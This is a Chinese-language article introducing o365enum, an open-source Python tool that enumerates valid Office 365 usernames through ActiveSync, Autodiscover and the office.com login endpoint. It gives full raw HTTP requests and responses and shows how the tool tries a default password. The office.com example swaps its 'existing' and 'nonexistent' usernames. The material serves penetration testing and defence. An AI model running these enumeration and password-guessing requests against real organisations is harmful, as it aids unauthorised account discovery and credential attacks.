![](https://image.3001.net/images/20201015/1602753740_5f8814cc242e4e8854e8b.jpg!small)

## o365enum

o365enum的全称为Office 365 User Enumeration，它是一款功能强大的Office
365用户枚举工具，该工具基于Python语言开发，并且能够使用ActiveSync、Autodiscover或office.com登录页面所返回的信息来枚举有效的Office
365用户名。

## 工具下载

广大研究人员可以使用下列命令将该项目源码克隆至本地：

    
    
    git clone https://github.com/gremwell/o365enum.git

## 工具使用

o365enum可以从第一个参数所提供的文件中读取用户名信息，这个文件中每一个用户名占一行。为了方便解析，输出数据的文件格式为CSV，有效状态有0（无效用户）、1（有效用户）和2（有效用户和有效密码）。

    
    
    python3.6 o365enum.py -h
    
    usage: o365enum.py [-h] -u USERLIST [-p PASSWORD] [-n NUM] [-v]
    
                       [-m {activesync,autodiscover,office.com}]
    
     
    
    Office365 User Enumeration Script
    
     
    
    optional arguments:
    
      -h, --help            显示帮助信息和退出
    
      -u USERLIST, --userlist USERLIST
    
                            用户名列表，每个用户名占一行(默认: None)
    
      -p PASSWORD, --password PASSWORD
    
                            密码尝试(默认: Password1)
    
      -n NUM, --num NUM     重试次数，降低假阳性(默认: 3)
    
      -v, --verbose         启用Verbose输出(默认: False)
    
      -m {activesync,autodiscover,office.com}, --method {activesync,autodiscover,office.com}
    
                            需要使用的枚举方法(默认: activesync)

## 工具运行样例

    
    
    ./o365enum.py -u users.txt -p Password2 -n 1 -m activesync
    
    username,valid
    
    nonexistent@contoso.com,0
    
    existing@contoso.com,1

## 枚举方法-ActiveSync枚举

这个方法给予grimhacker的方法实现，ta所实现的方法可以向ActiveSync节点发送基础HTTP认证请求，但是通过检测状态码的方式并不适用于Office365，因为无论目标用户是否存在，Office365都会返回401。

虽然o365enum会发送相同的请求，但它会检测一个自定义的HTTP响应Header（X-MailboxGuid）是否存在以确定用户名是否有效。

### 现有账号

下面请求的中Authorization Header中包含了Base64编码的凭证数据：valid_user@contoso.com:Password1

    
    
    OPTIONS /Microsoft-Server-ActiveSync HTTP/1.1
    
    Host: outlook.office365.com
    
    Connection: close
    
    MS-ASProtocolVersion: 14.0
    
    Content-Length: 0
    
    Authorization: Basic dmFsaWRfdXNlckBjb250b3NvLmNvbTpQYXNzd29yZDE=

该请求将触发下列带有X-MailboxGuid Header的响应（"401 Unauthorized"），这表明目标用户名有效，但密码无效：

    
    
    Date: Fri, 31 Jan 2020 13:02:46 GMT
    
    Connection: close
    
    HTTP/1.1 401 Unauthorized
    
    Content-Length: 1293
    
    Content-Type: text/html
    
    Server: Microsoft-IIS/10.0
    
    request-id: d494a4bc-3867-436a-93ef-737f9e0522eb
    
    X-CalculatedBETarget: AM0PR09MB2882.eurprd09.prod.outlook.com
    
    X-BackEndHttpStatus: 401
    
    X-RUM-Validated: 1
    
    X-MailboxGuid: aadaf467-cd08-4a23-909b-9702eca5b845 <--- This header leaks the account status (existing)
    
    X-DiagInfo: AM0PR09MB2882
    
    X-BEServer: AM0PR09MB2882
    
    X-Proxy-RoutingCorrectness: 1
    
    X-Proxy-BackendServerStatus: 401
    
    X-Powered-By: ASP.NET
    
    X-FEServer: AM0PR06CA0096
    
    WWW-Authenticate: Basic Realm="",Negotiate
    
    Date: Fri, 31 Jan 2020 13:02:46 GMT
    
    Connection: close
    
     
    
    --snip--
### 不存在的账户

下面请求的中Authorization Header中包含了Base64编码的凭证数据：invalid_user@contoso.com:Password1

    
    
    OPTIONS /Microsoft-Server-ActiveSync HTTP/1.1
    
    Host: outlook.office365.com
    
    Connection: close
    
    MS-ASProtocolVersion: 14.0
    
    Content-Length: 2
    
    Authorization: Basic aW52YWxpZF91c2VyQGNvbnRvc28uY29tOlBhc3N3b3JkMQ==

该请求将触发下列响应（"401 Unauthorized"），这表明目标用户名无效：

    
    
    HTTP/1.1 401 Unauthorized
    
    Content-Length: 1293
    
    Content-Type: text/html
    
    Server: Microsoft-IIS/10.0
    
    request-id: 2944dbfc-8a1e-4759-a8a2-e4568950601d
    
    X-CalculatedFETarget: DB3PR0102CU001.internal.outlook.com
    
    X-BackEndHttpStatus: 401
    
    WWW-Authenticate: Basic Realm="",Negotiate
    
    X-FEProxyInfo: DB3PR0102CA0017.EURPRD01.PROD.EXCHANGELABS.COM
    
    X-CalculatedBETarget: DB7PR04MB5452.eurprd04.prod.outlook.com
    
    X-BackEndHttpStatus: 401
    
    X-RUM-Validated: 1
    
    X-DiagInfo: DB7PR04MB5452
    
    X-BEServer: DB7PR04MB5452
    
    X-Proxy-RoutingCorrectness: 1
    
    X-Proxy-BackendServerStatus: 401
    
    X-FEServer: DB3PR0102CA0017
    
    X-Powered-By: ASP.NET
    
    X-FEServer: AM0PR04CA0024
    
    Date: Fri, 31 Jan 2020 16:19:11 GMT
    
    Connection: close
    
     
    
    --snip--
## 枚举方法-Autodiscover枚举

Autodiscover
节点允许我们在不需要进行认证尝试的情况下实现用户枚举，如果目标用户存在，该节点将返回200状态码，如果用户不存在，则返回302状态码。

### 现有账号

    
    
    GET /autodiscover/autodiscover.json/v1.0/existing@contoso.com?Protocol=Autodiscoverv1 HTTP/1.1
    
    Host: outlook.office365.com
    
    User-Agent: Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.12026; Pro
    
    Accept-Encoding: gzip, deflate
    
    Accept: */*
    
    Connection: close
    
    MS-ASProtocolVersion: 14.0
    
    
    HTTP/1.1 200 OK
    
    Cache-Control: private
    
    Content-Length: 97
    
    Content-Type: application/json; charset=utf-8
    
    Vary: Accept-Encoding
    
    Server: Microsoft-IIS/10.0
    
    request-id: fee7f899-7115-43da-9d34-d3ee19920a89
    
    X-CalculatedBETarget: AM0PR09MB2882.eurprd09.prod.outlook.com
    
    X-BackEndHttpStatus: 200
    
    X-RUM-Validated: 1
    
    X-AspNet-Version: 4.0.30319
    
    X-DiagInfo: AM0PR09MB2882
    
    X-BEServer: AM0PR09MB2882
    
    X-Proxy-RoutingCorrectness: 1
    
    X-Proxy-BackendServerStatus: 200
    
    X-Powered-By: ASP.NET
    
    X-FEServer: AM0PR0202CA0008
    
    Date: Mon, 02 Mar 2020 12:50:48 GMT
    
    Connection: close
    
     
    
    {"Protocol":"Autodiscoverv1","Url":"https://outlook.office365.com/autodiscover/autodiscover.xml"}

### 不存在的用户

    
    
    GET /autodiscover/autodiscover.json/v1.0/nonexistent@contoso.com?Protocol=Autodiscoverv1 HTTP/1.1
    
    Host: outlook.office365.com
    
    User-Agent: Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.12026; Pro
    
    Accept-Encoding: gzip, deflate
    
    Accept: */*
    
    Connection: close
    
    MS-ASProtocolVersion: 14.0
    
    
    HTTP/1.1 302 Found
    
    Cache-Control: private
    
    Content-Length: 277
    
    Content-Type: text/html; charset=utf-8
    
    Location: https://outlook.office365.com/autodiscover/autodiscover.json?Email=nonexistent%40contoso.com&Protocol=Autodiscoverv1&RedirectCount=1
    
    Server: Microsoft-IIS/10.0
    
    request-id: 1c50adeb-53ac-41b9-9c34-7045cffbae45
    
    X-CalculatedBETarget: DB6PR0202MB2568.eurprd02.prod.outlook.com
    
    X-BackEndHttpStatus: 302
    
    X-RUM-Validated: 1
    
    X-AspNet-Version: 4.0.30319
    
    X-DiagInfo: DB6PR0202MB2568
    
    X-BEServer: DB6PR0202MB2568
    
    X-Proxy-RoutingCorrectness: 1
    
    X-Proxy-BackendServerStatus: 302
    
    X-Powered-By: ASP.NET
    
    X-FEServer: AM0PR0202CA0013
    
    Date: Mon, 02 Mar 2020 12:50:50 GMT
    
    Connection: close
    
     
    
    <html><head><title>Object moved</title></head><body>
    
    <h2>Object moved to <a href="https://outlook.office365.com/autodiscover/autodiscover.json?Email=nonexistent%40contoso.com&Protocol=Autodiscoverv1&RedirectCount=1">here</a>.</h2>
    
    </body></html>

## 枚举方法-Office.com枚举

这种方法仅适用于身份为Exchange Online订阅用户并且没有部署/混合部署Exchange服务器的组织。

对于某些在内部部署或混合部署Exchange服务器的组织来说，服务器所返回的值可能并不能准确标明目标用户是否存在。

当你不想使用“Password1”进行认证尝试的时候，这种方法就很管用了。

### 现存用户

当目标账户存在，IfExistsResult则会被设置为1：

    
    
    POST /common/GetCredentialType?mkt=en-US HTTP/1.1
    
    Host: login.microsoftonline.com
    
    Accept-Encoding: gzip, deflate
    
    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36
    
    Accept: application/json
    
    Connection: close
    
    client-request-id: 4345a7b9-9a63-4910-a426-35363201d503
    
    hpgrequestid: 23975ac9-f51c-443a-8318-db006fd83100
    
    Referer: https://login.microsoftonline.com/common/oauth2/authorize
    
    canary: --snip--    
    hpgact: 1800
    
    hpgid: 1104
    
    Origin: https://login.microsoftonline.com
    
    Cookie: --snip--    
    Content-Length: 1255
    
    Content-Type: application/json
    
     
    
    {
    
        "checkPhones": false,
    
        "isOtherIdpSupported": true,
    
        "isRemoteNGCSupported": true,
    
        "federationFlags": 0,
    
        "isCookieBannerShown": false,
    
        "isRemoteConnectSupported": false,
    
        "isSignup": false,
    
        "originalRequest": "rQIIA--snip--YWSO2",
    
        "isAccessPassSupported": true,
    
        "isFidoSupported": false,
    
        "isExternalFederationDisallowed": false,
    
        "username": "nonexistent@contoso.com",
    
        "forceotclogin": false
    
    }
    
    
    HTTP/1.1 200 OK
    
    Cache-Control: no-cache, no-store
    
    Pragma: no-cache
    
    Content-Type: application/json; charset=utf-8
    
    Expires: -1
    
    Strict-Transport-Security: max-age=31536000; includeSubDomains
    
    X-Content-Type-Options: nosniff
    
    client-request-id: 95bba645-c3b0-4566-b0f4-237bd3df2ca7
    
    x-ms-request-id: fea01b74-7a60-4142-a54d-7aa8f6471c00
    
    x-ms-ests-server: 2.1.9987.14 - WEULR2 ProdSlices
    
    Referrer-Policy: strict-origin-when-cross-origin
    
    P3P: CP="DSP CUR OTPi IND OTRi ONL FIN"
    
    Set-Cookie: fpc=Ai0TKYuyz3BCp7OL29pUnG7sYIXWAQAAABsDztUOAAAA; expires=Sat, 07-Mar-2020 12:57:44 GMT; path=/; secure; HttpOnly; SameSite=None
    
    Set-Cookie: x-ms-gateway-slice=estsfd; path=/; SameSite=None; secure; HttpOnly
    
    Set-Cookie: stsservicecookie=ests; path=/; secure; HttpOnly; SameSite=None
    
    Date: Thu, 06 Feb 2020 12:57:43 GMT
    
    Connection: close
    
    Content-Length: 579
    
     
    
     
    
    {
    
        "ThrottleStatus": 0,
    
        "apiCanary": "--snip--",
    
        "Username": "nonexistent@contoso.com",
    
        "IfExistsResult": 1,
    
        "EstsProperties": {
    
            "UserTenantBranding": null,
    
            "DomainType": 3
    
        },
    
        "Credentials": {
    
            "PrefCredential": 1,
    
            "FidoParams": null,
    
            "RemoteNgcParams": null,
    
            "SasParams": null,
    
            "HasPassword": true
    
        },
    
        "IsSignupDisallowed": true,
    
        "Display": "nonexistent@contoso.com"
    
    }

### 不存在的用户

如果目标账户不存在，IfExistsResult将会被设置为0：

    
    
    POST /common/GetCredentialType?mkt=en-US HTTP/1.1
    
    Host: login.microsoftonline.com
    
    Accept-Encoding: gzip, deflate
    
    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36
    
    Accept: application/json
    
    Connection: close
    
    client-request-id: 4345a7b9-9a63-4910-a426-35363201d503
    
    hpgrequestid: 23975ac9-f51c-443a-8318-db006fd83100
    
    Referer: https://login.microsoftonline.com/common/oauth2/authorize
    
    canary: --snip--    
    hpgact: 1800
    
    hpgid: 1104
    
    Origin: https://login.microsoftonline.com
    
    Cookie: --snip--    
    Content-Length: 1255
    
    Content-Type: application/json
    
     
    
    {
    
        "checkPhones": false,
    
        "isOtherIdpSupported": true,
    
        "isRemoteNGCSupported": true,
    
        "federationFlags": 0,
    
        "isCookieBannerShown": false,
    
        "isRemoteConnectSupported": false,
    
        "isSignup": false,
    
        "originalRequest": "rQIIA--snip--YWSO2",
    
        "isAccessPassSupported": true,
    
        "isFidoSupported": false,
    
        "isExternalFederationDisallowed": false,
    
        "username": "existing@contoso.com",
    
        "forceotclogin": false
    
    }
    
    
    HTTP/1.1 200 OK
    
    Cache-Control: no-cache, no-store
    
    Pragma: no-cache
    
    Content-Type: application/json; charset=utf-8
    
    Expires: -1
    
    Strict-Transport-Security: max-age=31536000; includeSubDomains
    
    X-Content-Type-Options: nosniff
    
    client-request-id: 177110da-7ce4-4880-b856-be6326078046
    
    x-ms-request-id: c708b83f-4167-4b4c-a1db-d2011ecb3200
    
    x-ms-ests-server: 2.1.9966.8 - AMS2 ProdSlices
    
    Referrer-Policy: strict-origin-when-cross-origin
    
    P3P: CP="DSP CUR OTPi IND OTRi ONL FIN"
    
    Set-Cookie: fpc=ArU-Dva0f59Eg4t_V3VsX_TsYIXWAQAAAFRGxtUOAAAA; expires=Sun, 01-Mar-2020 16:01:26 GMT; path=/; secure; HttpOnly; SameSite=None
    
    Set-Cookie: x-ms-gateway-slice=prod; path=/; SameSite=None; secure; HttpOnly
    
    Set-Cookie: stsservicecookie=ests; path=/; secure; HttpOnly; SameSite=None
    
    Date: Fri, 31 Jan 2020 16:01:26 GMT
    
    Connection: close
    
    Content-Length: 587
    
     
    
    {
    
        "Username":"existing@contoso.com",
    
        "Display":"existing@contoso.com",
    
        "IfExistsResult":0,
    
        "ThrottleStatus":0,
    
        "Credentials":{
    
            "PrefCredential":1,
    
            "HasPassword":true,
    
            "RemoteNgcParams":null,
    
            "FidoParams":null,
    
            "SasParams":null
    
        },
    
        "EstsProperties":{
    
            "UserTenantBranding":null,
    
            "DomainType":3
    
        },
    
        "IsSignupDisallowed":true,
    
        "apiCanary":"--snip--"
    
    }

## 项目地址

o365enum：【[ _GitHub传送门_](https://github.com/gremwell/o365enum)】

